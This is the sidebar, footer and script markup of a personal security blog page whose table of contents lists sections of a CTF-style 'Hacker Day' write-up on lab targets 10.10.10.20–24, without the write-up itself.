                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/events/">events</a><sup>6</sup></div>
                </div>

                <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
                    <div class="niu2-sidebar-label">
                        <i id="niu2-sidebar-toc-ctrl" class="icon-open-tocs"></i>Table of contents
                    </div>
                    <ul id="niu2-sidebar-toc-list">
                        <li><a href="#content-heading">usd AG Hacker Day in Hamburg</a></li>
                        <li><a href='#c9438b851d34cfbecdc47796c0e488d6'>Targets¶</a><ul><li><a href='#8c16bdcafff53f9dd586182348068c1f'>10.10.10.20¶</a></li><li><a href='#6677766fec2b019c6444cd9a994ddfbe'>10.10.10.21¶</a></li><li><a href='#09e94d20319bbe99a7841cb5e87a2c11'>10.10.10.22¶</a></li><li><a href='#36189aa21426649f3415a28d22293918'>10.10.10.23¶</a></li><li><a href='#472916cd17fa81ca6ce710eb9a8e7a3d'>10.10.10.24¶</a></li></ul></li><li><a href='#6988aab4de844bedbe7984c3e74c1cc2'>Conclusion¶</a></li>
                        <li><a href="#content-comments">Comments</a></li>
                    </ul>
                </div>
            </div>
            <div id="niu2-toolbar">
                <ul class="list-unstyled">
                    <li><a id="niu2-toolbar-ctrlsidebar" href="#" title="Hide Sidebar"><i class="icon-3x icon-hide-sidebar"></i></a></li>
                </ul>
                <div id="niu2-toolbar-showsidebar" data-title="Show Sidebar"></div>
                <div id="niu2-toolbar-github" data-repo=""></div>
                <div id="niu2-toolbar-bitbucket" data-repo=""></div>
            </div>
            <div id="niu2-toc" data-style="fixed"></div>
        </div>

        <div class="niu2-footer">
            <div id="body-footer" class="col-md-6 col-md-offset-2">
                <hr/>
                <p>
                    Powered by <a href="https://github.com/getpelican/pelican">Pelican</a>, 
                    <a href="https://github.com/mawenbao/niu-x2-sidebar">theme</a> built with <a href="https://github.com/twbs/bootstrap">Bootstrap3</a>
                    by <a href="https://blog.mawenbao.com">Ma Wenbao</a>, icons by 
                    <a href="https://fortawesome.github.io/Font-Awesome">Font Awesome</a>.
                </p>
                <p>
                    © 2008 - 2016
                    <a class="niu2-footer-link" href="http://blog.dornea.nu">Victor Dorneanu</a>
                </p>
                <p class="niu2-icons">
                    <a class="niu2-footer-icon" href="https://pgp.mit.edu/pks/lookup?op=get&search=0x18F1AD46FB05E1B7" title="my public key">
                        <i class="icon-key icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="mailto: no-spam ÄATT dornea DOT nu" title="my email address">
                        <i class="icon-envelope-o icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="http://github.com/dorneanu" title="my github page">
                        <i class="icon-github-alt icon-lg"></i>
                    </a>
                    <a class="niu2-footer-icon" href="/feeds/rss.xml" title="subscribe my blog">
                        <i class="icon-rss icon-lg"></i>
                    </a>
                </p>
            </div>
        </div>

        <script type="text/javascript">
            var _gaq=_gaq||[];
            _gaq.push(["_setAccount","UA-7161767-3"]);
            _gaq.push(["_trackPageview"]);
            (function(){
                var b=document.createElement("script");
                b.type="text/javascript";
                b.async=true;
                b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";
                var a=document.getElementsByTagName("script")[0];
                a.parentNode.insertBefore(b,a)
            })();
        </script>
        <div id="niu2-pygments" data-theme="github"></div>
        <div id="niu2-lazy-load" data-loading-txt="Loading image" data-loading-icon="icon-spin icon-spinner"></div>
        <div id="niu2-toolbar-load" data-loading-icon="icon-spin icon-4x icon-spinner"></div>
        <script type="text/javascript" src="/js/custom.js"></script>
        <script type="text/javascript">
            onContentLoaded();
        </script>
    </body>
</html>